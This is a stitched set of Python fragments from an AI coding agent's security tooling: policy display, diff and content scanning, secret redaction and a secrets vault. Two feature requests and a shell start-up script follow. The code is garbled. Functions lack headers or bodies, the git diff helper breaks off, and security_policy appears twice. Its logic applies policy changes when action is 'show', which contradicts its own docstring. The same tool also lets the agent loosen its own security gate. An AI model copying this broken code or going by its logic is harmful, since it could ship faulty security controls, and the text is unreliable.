    """Declare that a secret is needed so the operator can provide it out of band.

            "--tools execute_command\n"
            "```\n\n"
            "Never paste the value in a message. `secrets_list` reports `ready` "

def security_policy(action: str = "show", changes: Optional[Dict[str, Any]] = None, **kwargs) -> ToolResponse:
    """Show or adjust the CISO policy of the project.

    The policy is stored in the project settings under ``ciso_policy``. Only the
    fields listed in the report can be changed, and every change is validated
    against the policy model before it is applied.

    Args:
        action: ``show`` (default) to display the effective policy.
        changes: Partial policy to merge (``action='show'`` ignores it). Fields
            include ``enabled``, ``block_above``, ``approval_above``,
            ``warn_above``, ``redact_secrets``, ``fail_closed``,
            ``ignore_paths``, ``ignore_rules``, ``allow_secret_files``.

    Returns:
        ToolResponse: The effective policy as Markdown.

    Example:
        >>> security_policy()  # doctest: +SKIP
    """
    settings = _settings_of(kwargs)
    if not settings:
        raise Exception("Invalid project settings")

    stored: Dict[str, Any] = {}
    configured = getattr(settings, "settings", None)
    if isinstance(configured, dict) and isinstance(configured.get(ciso_policy.POLICY_SETTINGS_KEY), dict):
        stored = dict(configured[ciso_policy.POLICY_SETTINGS_KEY])

    if changes and action == "show":
        merged = dict(stored)
        merged.update(changes or {})
        validated = ciso_policy.policy_from_dict(merged)
        try:
            configured = getattr(settings, "settings", None)
            if isinstance(configured, dict):
                configured[ciso_policy.POLICY_SETTINGS_KEY] = validated.to_dict()
                save = getattr(settings, "save", None)
                if callable(save):
                    save()
            else:
                return ToolResponse(
                    user_response="⚠️ This project settings object does not expose a writable `settings` dict.",
                    llm_response="security_policy: unsupported settings object",
                )
        except Exception as ex:
            return ToolResponse(
                user_response=f"⚠️ Could not persist the policy: {ex}",
                llm_response=f"security_policy: persist failed: {ex}",
            )

    policy = resolve_policy(settings)
    markdown = _policy_markdown(policy, stored)
    return ToolResponse(
        user_response=markdown,
        llm_response=f"CISO policy: enabled={policy.enabled} "
                     f"block_above={policy.block_above.value} "
                     f"approval_above={policy.approval_above.value} "
                     f"fail_closed={policy.fail_closed}",
        logs=["CISO policy reported"],
    )


def _policy_markdown(policy: CisoPolicy, stored: Dict[str, Any]) -> str:
    """Render the effective policy as Markdown."""
    def _values(items) -> str:
        return ", ".join(f"`{item.value}`" for item in items) or "-"

    return "\n".join([
        "# CISO policy",
        "",
        f"- Enabled: **{policy.enabled}**",
        f"- Block severities: {_values(policy.block_severities)}",
        f"- Block categories: {_values(policy.block_categories)}",
        f"- Block above: `{policy.block_above.value}`",
        f"- Approval above: `{policy.approval_above.value}`",
        f"- Warn above: `{policy.warn_above.value}`",
        f"- Strict domains: {_values(policy.strict_domains)}",
        f"- Redact secrets: **{policy.redact_secrets}**",
        f"- Fail closed: **{policy.fail_closed}**",
        f"- Entropy threshold: `{policy.entropy_threshold}`",
        f"- Min secret length: `{policy.min_secret_length}`",
        "",
        "## Ignored paths",
        "```",
        "\n".join(policy.ignore_paths) or "-",
        "```",
        "## Silenced rules",
        "```",
        "\n".join(policy.ignore_rules) or "-",
        "```",
        "",
        f"_Stored overrides: {stored or 'none (defaults)'}_",
        "",
        "> Set `CODX_JUNIOR_CISO_DISABLED=1` in the environment for an emergency stop.",
    ])

    """Build the compact machine friendly summary for the model."""

        f"# {subject}",

        f"- blocked: {verdict.blocked}",

        f"- highest_severity: {(verdict.highest_severity.value if verdict.highest_severity else 'none')}",
        f"- risk_score: {verdict.risk_score}",

        lines.append(
            f"- [{finding.severity.value}] {finding.rule_id} @ {location}: "
            f"{finding.remediation or finding.reason}"

    """Return the unified diff requested by the caller.

    Args:

        base: Git reference to compare against.
        scope: ``all`` | ``staged`` | ``unstaged``.
        paths: Optional path filter.

    Returns:

    """
    from .project_tools import _run_git

    args: List[str] = ["diff", "--no-ext-diff", "--no-textconv", "--no-color", "-U3"]
    if scope == "staged":
        args.append("--cached")
    elif scope == "all":
        args.append(base or "HEAD")

    if paths:

        domain_value = SecurityDomain(domain)
    except ValueError:
        return ToolResponse(
            user_response=f"⚠️ Unknown domain `{domain}`. Valid: "
                          f"{', '.join(d.value for d in SecurityDomain)}",
            llm_response=f"security_scan_content: invalid domain {domain}",
        )

    verdict = scan_content(content, path=path, domain=domain_value, policy=policy)

    llm_summary = _llm_summary(verdict, "CISO content scan")
    if verdict.redacted_text is not None:
        llm_summary += (
            "\n\n## Redacted payload (safe to write)\n```\n"
            + verdict.redacted_text
            + "\n```\nUse this content instead of the original."
        )

    return ToolResponse(
        user_response=_verdict_answer(verdict, f"CISO scan — `{path or 'inline content'}`"),
        llm_response=llm_summary,
        logs=[f"CISO content scan: {verdict.summary}"],
    )


def security_review_changes(
    base: str = "HEAD",
    scope: str = "all",
    paths: Optional[List[str]] = None,
    **kwargs
) -> ToolResponse:
    """Review a change (working tree, staged or against a ref) before shipping it.

    This is the pull-request gate: only the **added** lines are inspected and
    the reported line numbers are the new file coordinates.

    Args:
        base: Git reference to compare against (default ``HEAD``).
        scope: ``all`` (working tree + staged vs base), ``staged`` (next commit)
            or ``unstaged`` (working tree vs index).
        paths: Optional list of paths to restrict the review.

    Returns:
        ToolResponse: Report of the change.

    Example:
        >>> security_review_changes(scope="staged")  # doctest: +SKIP
    """
    settings = _settings_of(kwargs)
    if not settings:
        raise Exception("Invalid project settings")

    policy = resolve_policy(settings)
    domain = SecurityDomain.GIT_COMMIT if scope == "staged" else SecurityDomain.PULL_REQUEST

    try:
        patch = _git_diff(settings, base=base, scope=scope, paths=paths)
    except Exception as ex:
        return ToolResponse(
            user_response=f"⚠️ Could not read the change: {ex}",
            llm_response=f"security_review_changes: {ex}",
        )

    if not (patch or "").strip():
        return ToolResponse(
            user_response="✅ No pending changes to review.",
            llm_response="security_review_changes: empty diff, nothing to review.",
        )

    verdict = scan_diff(patch, domain=domain, policy=policy)
    return ToolResponse(
        user_response=_verdict_answer(verdict, f"CISO review — scope `{scope}` vs `{base}`"),
        llm_response=_llm_summary(verdict, "CISO change review"),
        logs=[f"CISO change review: {verdict.summary}"],
    )


def security_check_command(command: str, **kwargs) -> ToolResponse:

def security_redact(text: str, **kwargs) -> ToolResponse:
    """Neutralise every detected secret inside *text*.

    Use it before sharing a log, a configuration file or a diff outside the
    project.

    Args:
        text: Payload to sanitise.

    Returns:
        ToolResponse: user_response carries the redacted text; the summary
        reports how many values were replaced.

    Example:
        >>> security_redact('token: <your-token-here>')  # doctest: +SKIP
    """
    settings = _settings_of(kwargs)
    policy = resolve_policy(settings)
    redacted, replacements = ciso_secrets.redact_text(text or "", policy)
    return ToolResponse(
        user_response=redacted if replacements else "_No secret detected._\n\n" + (text or ""),
        llm_response=(
            f"{replacements} secret(s) redacted.\n\n```\n{redacted}\n```"
            if replacements
            else "No secret detected."
        ),
        logs=[f"CISO redact: {replacements} replacement(s)"],
    )


def secrets_list(**kwargs) -> ToolResponse:
    """List the secrets the runtime can resolve — never their values.

    Use the returned names in a handle (``{{secret:NAME}}`` or ``{{env:NAME}}``)
    as the WHOLE value of the ``env`` map or of the ``stdin`` argument. A handle
    anywhere else (inside a command, a URL or a description) is refused.

    Args:
        **kwargs: Runtime injected settings.

    Returns:
        ToolResponse: The declared secrets with their availability.

    Example:
        >>> secrets_list()  # doctest: +SKIP
    """
    settings = _settings_of(kwargs)
    vault = ciso_vault.vault_for(settings)
    entries = vault.list()
    if not entries:
        return ToolResponse(
            user_response="No secret is declared for this project.",
            llm_response="secrets_list: no secret declared. Declare one with secrets_request.",
            logs=["CISO secrets: 0 declared"],
        )
    rows = [
        "| Name | Source | Status | Allowed tools | Description |",
        "| --- | --- | --- | --- | --- |",
    ]
    for meta in entries:
        tools = ", ".join(meta.allow_tools) or "-"
        rows.append(
            f"| `{meta.name}` | {meta.source} | {meta.status} | {tools} | "
            f"{meta.description or '-'} |"
        )
    rows.append("")
    rows.append(
        "A handle must be the WHOLE value of `env.<NAME>` or `stdin`, e.g. "
        '`{"command": "docker login --password-stdin registry.local", '
        '"stdin": "{{secret:NAME}}"}`. A handle inside `command` is rejected.'
    )
    return ToolResponse(
        user_response="\n".join(rows),
        llm_response="\n".join(
            f"- {meta.name} [{meta.source}] {meta.status}" for meta in entries
        ),
        logs=[f"CISO secrets: {len(entries)} declared"],
    )


def secrets_request(name: str, reason: str = "", **kwargs) -> ToolResponse:
    """Declare that a secret is needed so the operator can provide it out of band.

    The value must never be typed into the chat: it would land in the message
    history, the index and the provider's logs. This creates a ``pending`` entry;
    ``secrets_list`` reports ``ready`` once the operator has stored it.

    Args:
        name: Secret name (identifier, e.g. ``REGISTRY_PASSWORD``).
        reason: Why the task needs it (shown to the operator).
        **kwargs: Runtime injected settings.

    Returns:
        ToolResponse: Instructions for the operator.

    Example:
        >>> secrets_request("REGISTRY_PASSWORD")  # doctest: +SKIP
    """
    settings = _settings_of(kwargs)
    vault = ciso_vault.vault_for(settings)
    meta = vault.request(name, chat_id=str(kwargs.get("chat_id") or ""), reason=reason)
    return ToolResponse(
        user_response=(
            f"### Secret `{meta.name}` requested\n\n"
            "Ask the operator to provide it **outside the chat**:\n\n"
            "```bash\n"
            "export CODX_JUNIOR_VAULT_KEY=...   # once, from: ... vault keygen\n"
            f"python -m codx.junior.security.ciso.vault add {meta.name} "
            "--tools execute_command\n"
            "```\n\n"
            "Never paste the value in a message. `secrets_list` reports `ready` "
            "once it is stored."
        ),
        llm_response=(
            f"secrets_request: '{meta.name}' is pending. No value is stored yet. Values "
            "reach the vault only out of band (CLI or the secrets screen), because chat "
            "content is persisted, indexed and forwarded to the model provider. "
            "secrets_list reports 'ready' once the entry is available."
        ),
        logs=[f"CISO secrets: request '{meta.name}'"],
    )


def security_policy(action: str = "show", changes: Optional[Dict[str, Any]] = None, **kwargs) -> ToolResponse:
    """Show or adjust the CISO policy of the project.

    The policy is stored in the project settings under ``ciso_policy``. Only the
    fields listed in the report can be changed, and every change is validated
    against the policy model before it is applied.

    Args:
        action: ``show`` (default) to display the effective policy.
        changes: Partial policy to merge (``action='show'`` ignores it). Fields
            include ``enabled``, ``block_above``, ``approval_above``,
            ``warn_above``, ``redact_secrets``, ``fail_closed``,
            ``ignore_paths``, ``ignore_rules``, ``allow_secret_files``.

    Returns:
        ToolResponse: The effective policy as Markdown.

    Example:
        >>> security_policy()  # doctest: +SKIP
    """
    settings = _settings_of(kwargs)
    if not settings:
        raise Exception("Invalid project settings")

    stored: Dict[str, Any] = {}
    configured = getattr(settings, "settings", None)
    if isinstance(configured, dict) and isinstance(configured.get(ciso_policy.POLICY_SETTINGS_KEY), dict):
        stored = dict(configured[ciso_policy.POLICY_SETTINGS_KEY])

    if changes and action == "show":
        merged = dict(stored)
        merged.update(changes or {})
        validated = ciso_policy.policy_from_dict(merged)
        try:
            configured = getattr(settings, "settings", None)
            if isinstance(configured, dict):
                configured[ciso_policy.POLICY_SETTINGS_KEY] = validated.to_dict()
                save = getattr(settings, "save", None)
                if callable(save):
                    save()
            else:
                return ToolResponse(
                    user_response="⚠️ This project settings object does not expose a writable `settings` dict.",
                    llm_response="security_policy: unsupported settings object",
                )
        except Exception as ex:
            return ToolResponse(
                user_response=f"⚠️ Could not persist the policy: {ex}",
                llm_response=f"security_policy: persist failed: {ex}",
            )

    policy = resolve_policy(settings)
    markdown = _policy_markdown(policy, stored)
    return ToolResponse(
        user_response=markdown,
        llm_response=f"CISO policy: enabled={policy.enabled} "
                     f"block_above={policy.block_above.value} "
                     f"approval_above={policy.approval_above.value} "
                     f"fail_closed={policy.fail_closed}",
        logs=["CISO policy reported"],
    )


def _policy_markdown(policy: CisoPolicy, stored: Dict[str, Any]) -> str:
    """Render the effective policy as Markdown."""
    def _values(items) -> str:
        return ", ".join(f"`{item.value}`" for item in items) or "-"

    return "\n".join([
        "# CISO policy",
        "",
        f"- Enabled: **{policy.enabled}**",
        f"- Block severities: {_values(policy.block_severities)}",
        f"- Block categories: {_values(policy.block_categories)}",
        f"- Block above: `{policy.block_above.value}`",
        f"- Approval above: `{policy.approval_above.value}`",
        f"- Warn above: `{policy.warn_above.value}`",
        f"- Strict domains: {_values(policy.strict_domains)}",
        f"- Redact secrets: **{policy.redact_secrets}**",
        f"- Fail closed: **{policy.fail_closed}**",
        f"- Entropy threshold: `{policy.entropy_threshold}`",
        f"- Min secret length: `{policy.min_secret_length}`",
        "",
        "## Ignored paths",
        "```",
        "\n".join(policy.ignore_paths) or "-",
        "```",
        "## Silenced rules",
        "```",
        "\n".join(policy.ignore_rules) or "-",
        "```",
        "",
        f"_Stored overrides: {stored or 'none (defaults)'}_",
        "",
        "> Set `CODX_JUNIOR_CISO_DISABLED=1` in the environment for an emergency stop.",
    ])

request.description:
Secrets management on the UI + the operator section of the user manual. Today the only way to store a value is the CLI `python -m codx.junior.security.ciso.vault add NAME`, which is fine as the fallback but not as the product.

Backend (already implemented, `api/codx/junior/security/ciso/vault.py`): `SecretVault.list/declare/request/set_value/delete`, sources `env` (a value already in the runtime environment) and `secret` (Fernet-encrypted `.codx/secrets/vault.json`), grants per tool (`allow_tools`), audit trail `.codx/secrets/audit.jsonl`.

Required:
1. **API routes** under `/api/security/secrets` (project scoped, admin-only, session auth like the other admin endpoints):
   - `GET /` → the declared secrets with `name`, `source`, `status` (ready / pending / missing / unavailable), `allow_tools`, `description`, `last_used_at`. NEVER a value.
   - `POST /` → store a value. The value arrives in the POST body over HTTPS, is encrypted immediately, is never echoed back and is never logged (CISO: redact on the way in, and assert it in a test).
   - `POST /{name}/request` → declare a `pending` secret (what `secrets_request` does today).
   - `PATCH /{name}` → grants (`allow_tools`) and description.
   - `DELETE /{name}` → remove value + declaration, keep the audit row.
   - `GET /audit` → the last N audit rows (names only).
   - The value must NEVER appear in a `GET` response, in an error message, or in the app log. Add a test that asserts the string is absent from the response body and from the captured log.
2. **Vault key handling**: `CODX_JUNIOR_VAULT_KEY` must be generated on first boot if absent, stored with 0600 in the project `.codx` dir next to the vault, and reported in the UI as "key present / missing" without ever printing it. Decide and document whether the UI may rotate it (rotating invalidates every stored value).
3. **UI screen** (`web/`): "Secrets" under the project security settings.
   - Table: name, source, status badge, allowed tools, last used.
   - "Add secret" dialog with a masked input (type=password, no autocomplete, no value in the URL, cleared from state after submit), a name field with validation (`^[A-Za-z_][A-Za-z0-9_]*$`) and a tool picker bound to the real tool registry.
   - Copy-paste helper showing the exact handle to use in a tool call: `{"stdin": "{{secret:NAME}}"}`.
   - A visible warning that pasting a secret into the CHAT is not supported by design.
4. **User manual section** (`docs/` wiki page, product docs): "Managing secrets" — the handle concept, the two sources, the env vs stdin rule (a handle inside a command is refused), the allowed-tool grant, what is audited, how to rotate, what happens when a secret is missing (`vault_unavailable` / `missing`), and the honest limits (redaction is lossy; interactive logins belong in the browser/vault path).

Acceptance:
- An admin can add, list, re-grant and delete a secret from the UI with no value ever appearing in a network response, a log line or the browser history.
- A non-admin gets 403 on every route.
- The manual page is linked from the Secrets screen.
- `test_secrets_vault.py` still passes, plus new route tests for the "no value in the response" property.

request.description:
`api/codx/junior/security/ciso/vault.py` keeps the CISO package dependency-free on purpose and imports `cryptography.fernet` LAZILY. Consequence: `{{env:NAME}}` handles work everywhere, but `{{secret:NAME}}` degrades to `vault_unavailable` on any image without `cryptography`, and it never falls back to plaintext (by design).

Decide and implement:
1. Is `cryptography` present in the published image (`codx-junior-installer` / `codxjunior/codx-junior`)? Check `api/requirements*.txt`, the Dockerfile and the running container. If it is missing, either add it or document that only `{{env:NAME}}` is available.
2. `CODX_JUNIOR_VAULT_KEY` must be a deployment concern: documented in the installer docs (env file / compose `environment:`), generated once, backed up — losing it invalidates every stored value. Decide where it lives for a containerised deployment and state it explicitly.
3. Confirm `.codx/secrets/` (vault.json, meta.json, audit.jsonl) is git-ignored in every project template this platform creates, and that the files are written 0600. A `vault.json` committed by accident is worthless but a `meta.json`/`audit.jsonl` committed is a leak of names and usage.
4. Add the secrets tests to the CI command set so `api/tests/security/test_secrets_vault.py` runs with the rest of the security suite.

```sh scripts/run_api.sh
#!/bin/bash
# Dynamically set CODX_JUNIOR_PATH to the parent directory of the script
export CODX_JUNIOR_PATH="$(cd "$(dirname "$0")/.." && pwd)"
echo "CODX_JUNIOR_PATH: $CODX_JUNIOR_PATH"
echo "Starting api USER: ${USER} ($(id -u):$(id -g)) HOME: ${HOME}"

# A packaged image (see codx-junior-installer/demo) already ships the venv and a
# source tree it must not touch: the recursive chown and `uv sync` below are
# installation steps, not start-up steps, and cost tens of seconds per restart.
# Set CODX_JUNIOR_SKIP_INSTALL=1 to skip them.
if [ "$CODX_JUNIOR_SKIP_INSTALL" != "1" ]; then
  echo "Fix permissions"
  sudo chown -R ${USER} ${HOME}
  sudo chown ${USER} /var/run/docker.sock 2>/dev/null || true
fi

source ${CODX_JUNIOR_PATH}/set_env.sh

export PYTHONPATH=${CODX_JUNIOR_PATH}/api

cd ${CODX_JUNIOR_PATH}/api


# Run the FastAPI application using uvicorn
echo "Checking venv: '${CODX_JUNIOR_API_VENV}' ..."
if [ ! -d "${CODX_JUNIOR_API_VENV}/bin" ]; then
  echo "!!! venv not found. Installing at: ${CODX_JUNIOR_API_VENV}"
  bash ${CODX_JUNIOR_PATH}/scripts/install_api.sh
else
  echo "venv found!"
fi

source ${CODX_JUNIOR_API_VENV}/bin/activate

if [ "$CODX_JUNIOR_SKIP_INSTALL" != "1" ]; then
  # Sync the environment with pyproject.toml / uv.lock on start (development and
  # source-mounted deployments only: it downloads packages).
  uv sync
fi

echo "codx-junior api BACKGROUND: '${CODX_JUNIOR_API_BACKGROUND}' DEBUG: '${DEBUG}'"

API_PORT=$CODX_JUNIOR_API_PORT
if [ "$CODX_JUNIOR_API_BACKGROUND" != "" ]; then
  API_PORT=$CODX_JUNIOR_API_PORT_BACKGROUND
fi

if [ "$DEBUG" == "" ]; then
  echo "Running PROD api"
  # ONE worker by default: Socket.IO keeps the connected sessions (and the
  # in-memory CancellationTokens of the running turns) inside the process, so
  # with several workers a client reconnects/re-emits against another worker and
  # its chat looks stuck. Scale explicitly with WEB_CONCURRENCY only when a
  # shared Socket.IO message queue is configured.
  uvicorn codx.junior.main:app --workers ${WEB_CONCURRENCY:-1} --host 0.0.0.0 --port $API_PORT
elif [ "$CODX_JUNIOR_API_RELOAD" == "1" ] || [ "$CODX_JUNIOR_API_RELOAD" == "true" ]; then
  # Opt-in source reload for development ONLY. Never enable it when the AI
  # agents edit the project itself: every file change restarts uvicorn and
  # interrupts the in-flight chat turns (the harness would kill its own work).
  echo "Running DEBUG api with source reload"
  uvicorn codx.junior.main:app --reload --reload-exclude ".venv" --host 0.0.0.0 --port $API_PORT
else
  # DEBUG=1 only raises logging/verbosity here: the API is supervised by
  # supervisor/Docker and must not restart itself while a turn is running.
  echo "Running DEBUG api (no source reload; set CODX_JUNIOR_API_RELOAD=1 to enable)"
  uvicorn codx.junior.main:app --workers ${WEB_CONCURRENCY:-1} --host 0.0.0.0 --port $API_PORT
fi
```
